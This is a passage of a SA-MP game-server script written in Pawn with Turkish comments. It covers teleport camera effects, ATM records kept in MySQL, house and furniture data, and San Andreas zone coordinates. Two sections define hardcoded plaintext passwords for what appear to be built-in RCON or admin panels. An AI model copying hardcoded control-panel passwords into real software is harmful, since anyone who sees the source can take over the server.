	{"{416c8f}"},	{"{20253b}"},	{"{ac9277}"},	{"{124574}"},	{"{96816c}"}, // Colors 100, 101, 102, 103, 104
	{"{64686b}"},	{"{115083}"},	{"{a19984}"},	{"{385694}"},	{"{525661}"}, // Colors 105, 106, 107, 108, 109

	{"{7e6956}"},	{"{8d919a}"},	{"{596d86}"},	{"{483433}"},	{"{456250}"}, // Colors 110, 111, 112, 113, 114
	{"{730a28}"},	{"{223556}"},	{"{630d1a}"},	{"{a3adc6}"},	{"{6a5854}"}, // Colors 115, 116, 117, 118, 119

	{"{9b8a80}"},	{"{620b1c}"},	{"{5c5d5f}"},	{"{634428}"},	{"{741827}"}, // Colors 120, 121, 122, 123, 124
	{"{1c376e}"},	{"{ed6aae}"}                                                  // Colors 125, 126
};

// ***************************************
// Metin NOT : Ekledigim sistemlerin defineleri bu baþlýk altýnda olacak dolayýsýyla takip edilebilir....
// ***************************************
//gta 5 teleport



forward TeleportCam(playerid, step, Float:xg, Float:yg, Float:zg, Float:ag);
public TeleportCam(playerid, step, Float:xg, Float:yg, Float:zg, Float:ag)
{
switch (step)
{
case 1:
{
if(GetPVarInt(playerid,"ENDTP") > gettime() || IsPlayerInRangeOfPoint(playerid, 5.0, xg, yg, zg)) return true;
SetPVarInt(playerid,"ENDTP",gettime() + 10);
PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
tpp[playerid][0] = xg,tpp[playerid][1] = yg,tpp[playerid][2] = zg,tpp[playerid][3] = ag; // write end coords
GetPlayerPos(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]); // check start coords and write
if(IsPlayerInAnyVehicle(playerid) && 2 == GetPlayerState(playerid)) SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), playerid+1);
SetPlayerVirtualWorld(playerid,playerid+1);
TogglePlayerControllable(playerid,0);
SetPlayerCameraPos(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]+20);
SetPlayerCameraLookAt(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]);
SetTimerEx("TeleportCam",1000,false,"ii",playerid,2);
}
case 2:
{
PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
SetPlayerCameraPos(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]+50);
SetPlayerCameraLookAt(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]);
SetTimerEx("TeleportCam",1000,false,"ii",playerid,3);
}
case 3:
{
PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
SetPlayerCameraPos(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]+100);
SetPlayerCameraLookAt(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]);
SetTimerEx("TeleportCam",1000,false,"ii",playerid,4);
}
case 4:
{
PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
SetPlayerCameraPos(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]+200);
SetPlayerCameraLookAt(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]);
SetTimerEx("TeleportCam",1000,false,"ii",playerid,5);
}
case 5:
{
if(IsPlayerInAnyVehicle(playerid) && 2 == GetPlayerState(playerid))
{
SetVehiclePos(GetPlayerVehicleID(playerid),tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]);
SetVehicleZAngle(GetPlayerVehicleID(playerid),tpp[playerid][3]);
}
else
{
SetPlayerPos(playerid,tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]);
SetPlayerFacingAngle(playerid,tpp[playerid][3]);
}
InterpolateCameraPos(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2]+200, tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]+200, 3000);
InterpolateCameraLookAt(playerid, ttp[playerid][0],ttp[playerid][1],ttp[playerid][2], tpp[playerid][0],tpp[playerid][1],tpp[playerid][2], 3000);
SetTimerEx("TeleportCam",4000,false,"ii",playerid,6);
}
case 6:
{
PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
SetPlayerCameraPos(playerid, tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]+100);
SetPlayerCameraLookAt(playerid, tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]);
SetTimerEx("TeleportCam",1000,false,"ii",playerid,7);
}
case 7:
{
PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
SetPlayerCameraPos(playerid, tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]+50);
SetPlayerCameraLookAt(playerid, tpp[playerid][0],tpp[playerid][1],tpp[playerid][2]);
SetTimerEx("TeleportCam",1000,false,"ii",playerid,8);
}
case 8:
{
PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
TogglePlayerControllable(playerid, true);
SetPlayerVirtualWorld(playerid,0);
if(IsPlayerInAnyVehicle(playerid) && 2 == GetPlayerState(playerid)) SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), 0);
SetPlayerVirtualWorld(playerid,0);
SetCameraBehindPlayer(playerid);
}
}
return true;
}

stock ObjeBugCoz(playerid)
{
	

	if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
	if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
    new Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
    ivehicle[playerid] = Vehicle_Create(567,X,Y,Z,Angle,1,-1,9999); ChangeVehicleColor(ivehicle[playerid],3,209);
	ob[ivehicle[playerid]][0] = CreateDynamicObject(1188,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][1] = CreateDynamicObject(1189,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][2] = CreateDynamicObject(1186,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][3] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][4] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][5] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][6] = CreateDynamicObject(1100,0.0,0.0,0.0,0.0,0.0,0.0);
	ob[ivehicle[playerid]][7] = CreateDynamicObject(1130,0.0,0.0,0.0,0.0,0.0,0.0);
	objecount[ivehicle[playerid]] = 9;
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], ivehicle[playerid], 0.899999,2.750001,-0.659999,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], ivehicle[playerid], 0.879999,2.760000,-0.749999,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], ivehicle[playerid], -0.899999,-2.830000,-0.629999,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], ivehicle[playerid], -0.019999,-2.839999,-0.029999,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], ivehicle[playerid], -0.019999,-2.839999,0.129999,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], ivehicle[playerid], -0.019999,-2.859999,0.250000,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], ivehicle[playerid], 0.000000,-0.010000,-0.379999,0.000000,0.000000,0.000000);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][7], ivehicle[playerid], 0.000000,0.299999,-0.240000,0.000000,0.000000,0.000000);
	AddVehicleComponent(ivehicle[playerid],1097); ChangeVehiclePaintjob(ivehicle[playerid],2);
	SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
    Araba[playerid] = 1;
	return 1;
}

//Etkinlik Sistemi

stock IsVehicleDrivingBackwards(vehicleid)
{
    new Float:Float[3];
    if(GetVehicleVelocity(vehicleid, Float[1], Float[2], Float[0]))
    {
        GetVehicleZAngle(vehicleid, Float[0]);
        if(Float[0] < 90)
        {
            if(Float[1] > 0 && Float[2] < 0) return 1;
        }
        else if(Float[0] < 180)
        {
            if(Float[1] > 0 && Float[2] > 0) return 1;
        }
        else if(Float[0] < 270)
        {
            if(Float[1] < 0 && Float[2] > 0) return 1;
        }
        else if(Float[1] < 0 && Float[2] < 0) return 1;
    }
    return 0;
}

static stock
	g_szBuffer[4096]
;

#define formatEx(%0,%1) \
	(format(g_szBuffer, sizeof(g_szBuffer), %0, %1), g_szBuffer)
/*
#define this<%0>%1->func \
	%0(%1); public %0(%1)
*/
enum e_Flags(<<= 1) {
	e_Play = 0b1,
	e_Response
};

enum e_Event {
	e_Name[32],
	e_Exist,
	Float: e_PosX,
	Float: e_PosY,
	Float: e_PosZ,
	Float: e_Angle,
	e_Players
};

static
	e_Flags: g_Flags[MAX_PLAYERS],
	g_iEvent[e_Event],
	gVehicle[MAX_PLAYERS]
;

//Kask Sistemi
#define SLOT 1

//t Sistemi
new SeatbeltStatus[MAX_PLAYERS];

//metin define

new OnayliOyuncu[MAX_PLAYERS];

new BayrakMesaj[MAX_PLAYERS];
new BayrakMesaj2[MAX_PLAYERS];

//Wtune

#define    		C_ADMIN             0x4169E1FF
#define 		C_AVISO             0xB22222FF

new Text:wTuning1[23];
new Text:wTuning2[9];
new Text:wTuning3[6];
new Text:wTuning4[3];
new Text:wTuning5[3];
new modcmd[MAX_PLAYERS];



//label sistemi

#define MAX_LABELS                                 500
// Save labels file location
#define Label_Save                                 "labels/%i.ini"
// Colors
#define lightgreen                                                    0x23FF00FF
#define lgreen 							      "{6EF83C}"
#define lwhite 							      "{FFFFFF}"
#define lyellow                                                       "{FFFF22}"
#define lblue                                                         "{2255FF}"
#define lpink                                                         "{FF0077}"
#define lorange                                                       "{FF6622}"
#define lred                                                          "{FF0000}"
#define lgrey                                                         "{BEBEBE}"
#define lyellow2                                                      "{E1DE1C}"
/*New Stuff*/
new TextLabelID;
/*Enum*/
enum labelsinfo
{
	Text3D:Label,
	LabelText[256],
	Color,
	Float:POSX,
	Float:POSY,
 	Float:POSZ,
}
new Text3D:LabelsInfo[MAX_LABELS][labelsinfo];


enum DATA
{
	ChatEngel
};
new ServerAyarlari[DATA];

#define COLOR_RED 0xFF0000AA
#define COLOR_INDIGO 0x4B00B0AA
#define SpeedCheck(%0,%1,%2,%3,%4) floatround(floatsqroot(%4?(%0*%0+%1*%1+%2*%2):(%0*%0+%1*%1) ) *%3*1.6)

#define TCangear 2000 // 5000 ms ( 5 s ) that you need to wait before  gearing up.
#define TDCangear 2000 // 2000 ms ( 2 s ) that you need to wait before  gearing down.

new otovites[MAX_PLAYERS];

new PlayerGear[MAX_PLAYERS] = 1;
new PlayerCGear[MAX_PLAYERS] = 0;
new PlayerCDGear[MAX_PLAYERS] = 0;
new isyerimdeyim[MAX_PLAYERS] = 0;

//new flood[MAX_PLAYERS] =1; //ellemeyin.
//#define kacuyarýdaatsýn 5 //Kaç uyarýda atmasýný istediði yazýn ben 5 yaptým

//new bool:IsPlayerInModShop[MAX_PLAYERS];
new Text:TDEditor_TD[3];
new PlayerText:TDEditor_PTD[MAX_PLAYERS][1];
#define KARAKOL_SPAWN 5656
#define LOTTO_MIKTAR 65000
#define LOTTO_SURE 3600000 // 1 Saat
#define TXT_MaxSpeedCamera "{FFFFFF}[{FF0000}RADAR{FFFFFF}] HIZ LIMITI: {00FF00}"
#define MAX_CONNECTIONS_FROM_IP 3
#define flashtime 125
new girisSure[MAX_PLAYERS];
new bool: APlayerSpawnData[MAX_PLAYERS];
new loc_timer[MAX_PLAYERS], loc_timer2[MAX_PLAYERS];
new oldid[MAX_PLAYER_NAME]; new bool: locvarmi[MAX_PLAYER_NAME];
new God[MAX_PLAYERS];
new polisyazi[MAX_PLAYERS];
new SilahIzni[MAX_PLAYERS];
new freeze[MAX_PLAYERS];
new tiryazi[MAX_PLAYERS];
new asiriyazi[MAX_PLAYERS];
new TowOK[MAX_PLAYERS];
new AfkDurum[MAX_PLAYERS];
new HidrolikVarmi[MAX_PLAYERS];
new KomutZaman[MAX_PLAYERS];
new FloodZaman[MAX_PLAYERS];
new rankbildirdim[MAX_PLAYERS];
new carmsg[MAX_PLAYERS];
new canmsg[MAX_PLAYERS];
new Sellektor[MAX_PLAYERS];
new FloodUyari[MAX_PLAYERS];
new bakimvar;
new Text3D:PolisLabel[MAX_VEHICLES] = Text3D:-1;
new Text3D:TirciLabel[MAX_VEHICLES] = Text3D:-1;
new Text3D:AsiriLabel[MAX_VEHICLES] = Text3D:-1;
new Flash[MAX_VEHICLES];
new bool:Flashing[MAX_VEHICLES];
new FlashTime[MAX_VEHICLES];
new VehicleIsLocked[MAX_VEHICLES];

// [ Yeni tepe yazý sistemi ] ==================================================
new Text3D:Oyuncu3D[MAX_PLAYERS];
new AFKSure[MAX_PLAYERS];
//==============================================================================
#define COLOR_REDS         (0xFF0000FF)
#define COLOR_YELLOWS      (0xFFFF00FF)
#define COLOR_DEPARTMENT  (0xF0CC00FF)

#define SendErrorMessage(%0,%1) \
	SendClientMessage(%0, COLOR_REDS, "« [!] HATA »:{FFFFFF} "%1)

#define SendSyntaxMessage(%0,%1) \
	SendClientMessage(%0, COLOR_YELLOWS, "« [?] KULLANIM »:{FFFFFF} "%1) // COLOR_YELLOW
	
#define SendServerMessage(%0,%1) \
	SendClientMessage(%0, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} "%1)
	
#define SendServerMessageToAll(%1) \
 SendClientMessageToAll(COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} "%1)

#define COLOR_DARKBLUE    (0x1394BFFF)
#define MAX_ATM_MACHINES (100)

enum atmData {
	atmID,
	atmExists,
	Float:atmPos[4],
	atmInterior,
	atmWorld,
	atmObject,
	Text3D:atmText3D
};

new ATMData[MAX_ATM_MACHINES][atmData];

stock ATM_Delete(atmid)
{
	if (atmid != -1 && ATMData[atmid][atmExists])
	{
	    new
	        string[64];

		format(string, sizeof(string), "DELETE FROM `atm` WHERE `atmID` = '%d'", ATMData[atmid][atmID]);
		mysql_tquery(Connection, string);

        if (IsValidDynamicObject(ATMData[atmid][atmObject]))
	        DestroyDynamicObject(ATMData[atmid][atmObject]);

	    if (IsValidDynamic3DTextLabel(ATMData[atmid][atmText3D]))
	        DestroyDynamic3DTextLabel(ATMData[atmid][atmText3D]);

	    ATMData[atmid][atmExists] = false;
	    ATMData[atmid][atmID] = 0;
	}
	return 1;
}

ATM_Nearest(playerid)
{
    for (new i = 0; i != MAX_ATM_MACHINES; i ++) if (ATMData[i][atmExists] && IsPlayerInRangeOfPoint(playerid, 2.5, ATMData[i][atmPos][0], ATMData[i][atmPos][1], ATMData[i][atmPos][2]))
	{
		if (GetPlayerInterior(playerid) == ATMData[i][atmInterior] && GetPlayerVirtualWorld(playerid) == ATMData[i][atmWorld])
			return i;
	}
	return -1;
}
stock ATM_Create(playerid)
{
    new
	    Float:x,
	    Float:y,
	    Float:z,
	    Float:angle;

	if (GetPlayerPos(playerid, x, y, z) && GetPlayerFacingAngle(playerid, angle))
	{
		for (new i = 0; i < MAX_ATM_MACHINES; i ++) if (!ATMData[i][atmExists])
		{
		    ATMData[i][atmExists] = true;

		    x += 1.0 * floatsin(-angle, degrees);
			y += 1.0 * floatcos(-angle, degrees);

            ATMData[i][atmPos][0] = x;
            ATMData[i][atmPos][1] = y;
            ATMData[i][atmPos][2] = z;
            ATMData[i][atmPos][3] = angle;

            ATMData[i][atmInterior] = GetPlayerInterior(playerid);
            ATMData[i][atmWorld] = GetPlayerVirtualWorld(playerid);

			ATM_Refresh(i);
			mysql_tquery(Connection, "INSERT INTO `atm` (`atmInterior`) VALUES(0)", "OnATMCreated", "d", i);

			return i;
		}
	}
	return -1;
}
stock ATM_Refresh(atmid)
{
	if (atmid != -1 && ATMData[atmid][atmExists])
	{
	    if (IsValidDynamicObject(ATMData[atmid][atmObject]))
	        DestroyDynamicObject(ATMData[atmid][atmObject]);

	    if (IsValidDynamic3DTextLabel(ATMData[atmid][atmText3D]))
	        DestroyDynamic3DTextLabel(ATMData[atmid][atmText3D]);

		new
	        string[64];

		format(string, sizeof(string), "[ATM %d]\n{FFFFFF}/atm.", atmid);

		ATMData[atmid][atmObject] = CreateDynamicObject(19526, ATMData[atmid][atmPos][0], ATMData[atmid][atmPos][1], ATMData[atmid][atmPos][2] - 1, 0.0, 0.0, ATMData[atmid][atmPos][3]-1, ATMData[atmid][atmWorld], ATMData[atmid][atmInterior]);
        ATMData[atmid][atmText3D] = CreateDynamic3DTextLabel(string, COLOR_DARKBLUE, ATMData[atmid][atmPos][0], ATMData[atmid][atmPos][1], ATMData[atmid][atmPos][2], 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, ATMData[atmid][atmWorld], ATMData[atmid][atmInterior]);
		ATM_Save(atmid);
		return 1;
	}
	return 0;
}

stock ATM_Save(atmid)
{
	new
	    query[200];

	format(query, sizeof(query), "UPDATE `atm` SET `atmX` = '%.4f', `atmY` = '%.4f', `atmZ` = '%.4f', `atmA` = '%.4f', `atmInterior` = '%d', `atmWorld` = '%d' WHERE `atmID` = '%d'",
	    ATMData[atmid][atmPos][0],
	    ATMData[atmid][atmPos][1],
	    ATMData[atmid][atmPos][2],
	    ATMData[atmid][atmPos][3],
	    ATMData[atmid][atmInterior],
	    ATMData[atmid][atmWorld],
	    ATMData[atmid][atmID]
	);
	return mysql_tquery(Connection, query);
}
forward ATM_Load();
public ATM_Load()
{
    static
	    rows,
	    fields;

	cache_get_row_count(rows);
	cache_get_field_count(fields);

	for (new i = 0; i < rows; i ++) if (i < MAX_ATM_MACHINES)
	{
	    ATMData[i][atmExists] = true;
	    cache_get_value_name_int(i, "atmID", ATMData[i][atmID]);
	    cache_get_value_name_float(i, "atmX", ATMData[i][atmPos][0]);
        cache_get_value_name_float(i, "atmY", ATMData[i][atmPos][1]);
        cache_get_value_name_float(i, "atmZ", ATMData[i][atmPos][2]);
        cache_get_value_name_float(i, "atmA", ATMData[i][atmPos][3]);
        cache_get_value_name_int(i, "atmInterior", ATMData[i][atmInterior]);
		cache_get_value_name_int(i, "atmWorld", ATMData[i][atmWorld]);

		ATM_Refresh(i);
	}
	return 1;
}


//------------------------------------------
forward OnATMCreated(atmid);
public OnATMCreated(atmid)
{
    if (atmid == -1 || !ATMData[atmid][atmExists])
		return 0;

	ATMData[atmid][atmID] = cache_insert_id();
 	ATM_Save(atmid);

	return 1;
}

//*********
new Zone[36];
new FZone[2];

// ************************************************************************************************************************************************************
// Ferry Sistemi
// ************************************************************************************************************************************************************
new ferryI;
new ferry;
new FerryObject[30];

forward FerryLS(playerid);
forward FerryIS(playerid);
//anti ping
forward PingCheck();

// ************************************************************************************************************************************************************
// SPanel Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
#define PANEL_PASS              "Hakansametbaba"
#define DialogSPanelHome        3200
#define DialogSPanelGiris       3201
#define DialogSPanelRCON        3202

new Root[MAX_PLAYERS];


// ************************************************************************************************************************************************************
// Yedek Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
#define PANEL_PASS2              "hakansametbaba"
#define DialogSPanelHome2        3204
#define DialogSPanelGiris2       3205
#define DialogSPanelRCON2        3206

new Root2[MAX_PLAYERS];



// ************************************************************************************************************************************************************
// BoomBox Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
#define MAX_BOOMBOX          	MAX_PLAYERS

#define DialogBoombox           3100

enum BoomBoxInfos
{
	BBURL[256],
	BBSahip[50],
	Float:BBMesafe,
	Float:BBX,
	Float:BBY,
	Float:BBZ,
	BBInt,
	BBObj,
	Text3D:BB3D,
	BBExist
};

new BoomBoxlar[MAX_BOOMBOX][BoomBoxInfos];

new Iterator:BBs<MAX_BOOMBOX>;

new DinlenilenBoomBox[MAX_PLAYERS];

new EditingBBObject[MAX_PLAYERS];

new OyuncuBB[MAX_PLAYERS];


//******************************************************************************
// Ev Sistemi [ Reiss_Umut ]
//******************************************************************************
#define     MAX_HOUSES_N          (2000)
#define     MAX_HOUSE_NAME      (48)
#define     MAX_HOUSE_PASSWORD  (16)
#define     MAX_HOUSE_ADDRESS   (48)
#define     MAX_INT_NAME        (32)
#define     INVALID_HOUSE_ID    (-1)
#define     HOUSE_COOLDOWN      (6)
//#define     LIMIT_PER_PLAYER    (3)

#define     MAX_OBJE_SAYISI    50000

new bool:ObjeSistemde[MAX_OBJE_SAYISI];

enum    _:e_lockmodes
{
	LOCK_MODE_NOLOCK,
	LOCK_MODE_PASSWORD,
	LOCK_MODE_KEYS,
	LOCK_MODE_OWNER
}

enum    _:e_selectmodes
{
	SELECT_MODE_NONE,
	SELECT_MODE_EDIT,
	SELECT_MODE_SELL
}

enum	_:e_dialogids
{
	DIALOG_BUY_HOUSE = 7500,
	DIALOG_HOUSE_PASSWORD,
	DIALOG_HOUSE_MENU,
	DIALOG_HOUSE_NAME,
	DIALOG_HOUSE_NEW_PASSWORD,
	DIALOG_HOUSE_LOCK,
	DIALOG_SAFE_MENU,
	DIALOG_SAFE_TAKE,
	DIALOG_SAFE_PUT,
	DIALOG_GUNS_MENU,
	DIALOG_GUNS_TAKE,
	DIALOG_FURNITURE_MENU,
	DIALOG_FURNITURE_BUY,
	DIALOG_FURNITURE_SELL,
	DIALOG_VISITORS_MENU,
	DIALOG_VISITORS,
	DIALOG_KEYS_MENU,
	DIALOG_KEYS,
	DIALOG_SAFE_HISTORY,
	DIALOG_MY_KEYS,
	DIALOG_BUY_HOUSE_FROM_OWNER,
	DIALOG_SELL_HOUSE,
	DIALOG_SELLING_PRICE
}

enum    e_house
{
	HOName[MAX_HOUSE_NAME],
	Owner[MAX_PLAYER_NAME],
	Password[MAX_HOUSE_PASSWORD],
	Address[MAX_HOUSE_ADDRESS],
	Float: houseX,
	Float: houseY,
	Float: houseZ,
	Price,
	SalePrice,
	Interiors,
	LockMode,
	SafeMoney,
	LastEntered,
	Text3D: HouseLabel,
	HousePickup,
	HouseIcon,
	bool: Save
};

enum    e_interior
{
	IntName[MAX_INT_NAME],
	Float: intX,
	Float: intY,
	Float: intZ,
	intID,
	Text3D: intLabel,
	intPickup
};

enum    e_furnituredata
{
	ModelID,
	HOName[32],
	Price
};

enum    e_furniture
{
	SQLID,
	HouseIDsa,
	ArrayID,
	Float: furnitureX,
	Float: furnitureY,
	Float: furnitureZ,
	Float: furnitureRX,
	Float: furnitureRY,
	Float: furnitureRZ
};

enum    e_sazone
{
    SAZONE_NAME[28],
    Float: SAZONE_AREA[6]
};

new
	HouseTimer = -1,
 	HouseData[MAX_HOUSES_N][e_house],
	Iterator: Houses<MAX_HOUSES_N>,
	Iterator: HouseKeys[MAX_PLAYERS]<MAX_HOUSES_N>,
	InHouse[MAX_PLAYERS] = {INVALID_HOUSE_ID, ...},
	SelectMode[MAX_PLAYERS] = {SELECT_MODE_NONE, ...},
	LastVisitedHouse[MAX_PLAYERS] = {INVALID_HOUSE_ID, ...},
	ListPage[MAX_PLAYERS] = {0, ...},
	bool: EditingFurniture[MAX_PLAYERS] = {false, ...};

new
    HouseInteriors[][e_interior] = {
    // int name, x, y, z, intid
		/*{"Interior 1", 2233.4900, -1114.4435, 1050.8828, 5},
		{"Interior 2", 2196.3943, -1204.1359, 1049.0234, 6},
		{"Interior 3", 2318.1616, -1026.3762, 1050.2109, 9},
		{"Interior 4", 421.8333, 2536.9814, 10.0000, 10},
		{"Interior 5", 225.5707, 1240.0643, 1082.1406, 2},
		{"Interior 6", 2496.2087, -1692.3149, 1014.7422, 3},
		{"Interior 7", 226.7545, 1114.4180, 1080.9952, 5},
		{"Interior 8", 2269.9636, -1210.3275, 1047.5625, 10}*/
		{"»» Minik Ev ««", 			 		0.0, 		0.0, 		0.0, 		0}, // Dummy interior (Level 0), as the house-level starts at 1
		{"»» Minik Ev ««", 			 		2262.83, 	-1137.71, 	1050.63, 	10}, // Level 1
		{"»» Kucuk Ev ««", 			 		2467.36, 	-1698.38, 	1013.51, 	2}, // Level 2
		{"»» Kucuk Ev 2 ««", 			 	223.00, 	1289.26, 	1082.20, 	1}, // Level 3
		{"»» Orta Ev ««", 			 		2260.76, 	-1210.45, 	1049.02, 	10}, // Level 4
		{"»» Orta Ev 2 ««",			 		2365.42, 	-1131.85, 	1050.88, 	8}, // Level 5
		{"»» Dublex Ev ««",			 		2324.33, 	-1144.79, 	1050.71, 	12}, // Level 6
		{"»» Buyuk Ev ««", 					295.14, 	1474.47, 	1080.52, 	15}, // Level 7
		{"»» Buyuk Dublex Ev ««", 	 		235.50, 	1189.17, 	1080.34, 	3}, // Level 8
		{"»» Olaganustu Ev ««", 		 	225.63, 	1022.48, 	1084.07, 	7}, // Level 9
		{"»» Villa ««", 			 		1299.14, 	-794.77, 	1084.00, 	5}, // Level 10
		{"»» Rezidans ««", 			 		1574.2369, 	-1267.3341, 241.9359, 	0}, // Level 11
		{"»» Teknoloji Harihasý Ev ««", 	1412.01, 	-1477.02,  	125.39, 	0} // Level 12
    };


new
	HouseFurnitures[][e_furnituredata] = {
	// modelid, furniture name, price
	    {3111, "Building Plan", 500},
	    {2894, "Book", 20},
	    {2277, "Cat Picture", 100},
	    {1753, "Leather Couch", 150},
	    {1703, "Black Couch", 200},
	    {1255, "Lounger", 75},
	    {19581, "Frying Pan", 10},
	    {19584, "Sauce Pan", 12},
	    {19590, "Woozie's Sword", 1000},
	    {19525, "Wedding Cake", 50},
	    {1742, "Bookshelf", 80},
	    {1518, "TV 1", 130},
	    {19609, "Drum Kit", 500},
		{19787, "Small LCD TV", 2000},
		{19786, "Big LCD TV", 4000},
		{2627, "Treadmill", 130}
	};

new
	SAZones[][e_sazone] = {
		{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
		{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
		{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
		{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
		{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
		{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
		{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
		{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
		{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
		{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
		{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
		{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
		{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
		{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
		{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
		{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
		{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
		{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
		{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
		{"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
		{"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
		{"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
		{"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
		{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
		{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
		{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
		{"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
		{"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
		{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
		{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
		{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
		{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
		{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
		{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
		{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
		{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
		{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
		{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
		{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
		{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
		{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
		{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
